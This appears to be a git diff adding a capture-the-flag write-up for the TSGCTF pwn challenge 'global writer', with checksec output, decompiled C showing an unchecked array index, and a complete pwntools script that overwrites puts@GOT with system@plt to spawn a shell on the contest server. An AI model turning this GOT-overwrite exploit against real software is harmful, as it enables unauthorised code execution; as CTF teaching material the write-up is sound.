@@ -564,6 +564,7 @@ system((char*)stdout)
 
 and since ```stdout``` begins with ```"sh\0"```, we get a shell
 
+![The Game](assets/tsgflag.png)
 
 ## rev - medicine (96 solves)
 
@@ -827,7 +828,105 @@ print(result.decode())
 
 ```TSGCTF{51gn4l_h4ndl3r_r0t13_x0r}```
 
+## pwn - global writer (245 solves)
+
+```shell
+tlsbollei@tlsbollei mnt/.../global_writer file chal
+chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f5fdd19da83b1bc2395b87e2ccd73389b1cad9da, for GNU/Linux 3.2.0, not stripped
+tlsbollei@tlsbollei mnt/.../global_writer checksec chal
+[*] '/mnt/c/Users/tlsbo/Downloads/global_writer/global_writer/chal'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+immediately notice the bug - 
+
+```c
+void edit(void)
+
+{
+  long lVar1;
+  int iVar2;
+  long in_FS_OFFSET;
+  
+  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
+  while( true ) {
+    printf("index? > ");
+    iVar2 = __isoc99_scanf(&DAT_00402032,&idx);
+    if (iVar2 != 1) {
+      handle_error();
+    }
+    if (idx == -1) break;
+    printf("value? > ");
+    iVar2 = __isoc99_scanf(&DAT_00402032,&values + idx);
+    if (iVar2 != 1) {
+      handle_error();
+    }
+  }
+  puts(msg);
+  printf("Array: ");
+  for (i = 0; i < 0x10; i = i + 1) {
+    printf("%d ",(ulong)(uint)(&values)[i]);
+  }
+  putchar(10);
+  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+
+there is no bounds check on ```idx``` in ```values[idx]``` write. only checks for ```idx == -1``` to exit loop, which becomes our exploit trigger. from this, we can have an arbitrary write relative to values base, and given index can be negative or large, allowing for writes before and after the values array.
+
+![variables(assets/ab.png)
+
+now we have the addresses of the two variables ```msg``` and ```values```. we see the program calling ```puts(msg);```, and as we have a constraint write-what-where primitive we can overwrite the GOT entry of ```puts@GOT``` to point to the stub ```system@plt```, and we can also overwrite the ```msg``` variable, turning ```puts(msg)``` into ```system("sh")```.
+
+```objdump -R chal | grep ' puts@'``` confirms ```0000000000404020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5```, ```objdump -d chal | grep '<system@plt>'``` confirms ```00000000004010f0 <system@plt>:```
+
+because ```values``` is ```int values[SIZE]```, so the write target becomes ```write_addr=&values[0]+4⋅idx```. now we just resolve at what index to point what, bear with my drawings
+
+![variable(assets/draw.png)
+
+therefore, the final plan is :
+1. write command string "sh\0" to ```values[0]``` at 0x4040c0 as little endian 32 bit int ```0x00006873``` = ```26739```, overwrite ```msg``` pointer to point to ```0x4040c0```, writing ```4211904``` at index -22 (see above), hijack ```puts@GOT``` to point to ```system@plt``` at index -40, exit loop with index -1 to pop shell 
+
+```python
+from pwn import *
+
+elf = ELF('./chal')
+context.binary = elf
+
+#p = process('./chal')
+p = remote("34.84.25.24", 58554)
+
+values_addr = 0x4040c0
+msg_ptr_addr = 0x404068
+puts_got = 0x404020
+system_plt = 0x4010f0
+
+msg_offset = (msg_ptr_addr - values_addr) // 4  # -22
+puts_offset = (puts_got - values_addr) // 4     # -40
+
+sh_value = u32(b"sh\x00\x00")  # 26739
+p.sendlineafter(b'> ', b'0')
+p.sendlineafter(b'> ', str(sh_value).encode())
+p.sendlineafter(b'> ', str(msg_offset).encode())
+p.sendlineafter(b'> ', str(values_addr).encode())
+p.sendlineafter(b'> ', str(puts_offset).encode())
+p.sendlineafter(b'> ', str(system_plt).encode())
+p.sendlineafter(b'> ', b'-1')
+
+p.interactive()
+```
+
+![variabe(assets/yield.png)
 
 
-## rev - medicine
-## rev - medicine
